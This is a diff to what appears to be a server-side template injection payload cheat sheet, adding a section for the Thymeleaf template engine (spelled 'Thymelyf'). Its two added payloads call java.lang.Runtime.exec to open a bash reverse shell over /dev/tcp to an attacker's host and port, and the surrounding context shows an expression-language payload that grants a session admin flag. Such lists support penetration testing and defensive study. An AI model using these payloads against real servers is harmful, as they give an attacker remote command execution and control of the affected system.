@@ -341,6 +341,15 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.getAttribute("a")}
     ```
 
+### Thymelyf 
+```
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c $@|bash 0 echo bash -i >& /dev/tcp/ip/port 0>&1')}
+
+
+<p th:text=\"${''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1')}\">
+```
+
+
 ## References
 
 - [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
